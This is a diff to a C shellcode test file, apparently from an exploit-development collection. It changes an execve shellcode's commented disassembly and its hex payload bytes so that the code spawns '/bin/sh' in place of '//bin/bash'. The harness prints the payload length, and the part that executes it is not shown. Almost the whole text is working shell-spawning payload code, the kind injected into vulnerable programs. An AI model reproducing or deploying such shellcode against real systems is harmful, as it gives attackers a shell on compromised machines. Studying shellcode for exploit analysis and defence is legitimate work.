@@ -13,7 +13,7 @@ Disassembly of section .text:
 
 000000000040008e <_start>:
   40008e:       e8 ed ff ff ff          callq  400080 <SysExecve>
-  400093:       2f2f62696e2f62617368    ASCII '//bin/bash'
+  400093:       2f62696e2f7368          ASCII '/bin/sh'
  */
 
 #include<stdio.h>
@@ -26,8 +26,8 @@ unsigned char payload[] =
 "\x48\x89\xc2"
 "\xb0\x3b\x0f\x05"
 "\xe8\xed\xff\xff\xff"
-"\x2f\x2f\x62\x69\x6e"
-"\x2f\x62\x61\x73\x68";
+"\x2f\x62\x69\x6e"
+"\x2f\x73\x68";
 
 void main() {
 printf("Shellcode Length: %d\n", (int) strlen(payload));
